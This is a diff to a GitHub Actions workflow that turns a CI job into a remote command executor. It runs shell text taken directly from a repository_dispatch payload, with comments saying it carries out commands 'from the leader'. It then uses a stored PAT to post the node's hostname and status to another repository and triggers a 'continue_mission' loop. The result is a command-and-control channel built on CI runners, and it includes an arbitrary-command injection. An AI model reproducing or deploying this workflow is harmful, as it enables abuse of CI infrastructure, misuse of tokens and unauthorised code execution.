@@ -7,27 +7,36 @@ jobs:
   execute_task:
     runs-on: ubuntu-latest
     steps:
-      - name: "1. Checkout"
+      - name: "1. Checkout Source"
         uses: actions/checkout@v4
 
-      - name: "2. Run Protocol"
-        id: exec
+      - name: "2. Tactical Execution"
+        id: run_mission
         continue-on-error: true
         run: |
-          # محاولة تنفيذ المهمة
+          # تنفيذ الأوامر المستلمة من القائد
           ${{ github.event.client_payload.commands }}
 
-      - name: "3. Deep Failure Report"
-        if: steps.exec.outcome == 'failure'
+      - name: "3. Smart Failure Reporting"
+        if: steps.run_mission.outcome == 'failure'
         env:
           PAT: ${{ secrets.PAT }}
         run: |
-          # إرسال بلاغ مفصل للقائد
-          MSG="Execution Error on node: $(hostname). Check YAML structure and PAT permissions."
-          JSON_DATA=$(jq -n --arg log "$MSG" '{"event_type": "executor_failed", "client_payload": {"error_log": $log}}')
-          
+          # تلخيص الخطأ وإرساله للقائد فوراً
+          ERROR_MSG="Execution node $(hostname) failed to process commands. Possible YAML or Logic error."
+          PAYLOAD=$(jq -n --arg log "$ERROR_MSG" '{"event_type": "executor_failed", "client_payload": {"error_log": $log}}')
+
           curl -L -X POST -H "Authorization: Bearer $PAT" \
                -H "Accept: application/vnd.github+json" \
                https://api.github.com/repos/cczxjdxz-max/avatar-template/dispatches \
-               -d "$JSON_DATA"
+               -d "$PAYLOAD"
           exit 1
+
+      - name: "4. Signal Continuous Success"
+        if: success()
+        env:
+          PAT: ${{ secrets.PAT }}
+        run: |
+          curl -L -X POST -H "Authorization: Bearer $PAT" \
+               https://api.github.com/repos/cczxjdxz-max/avatar-template/dispatches \
+               -d '{"event_type": "continue_mission"}'
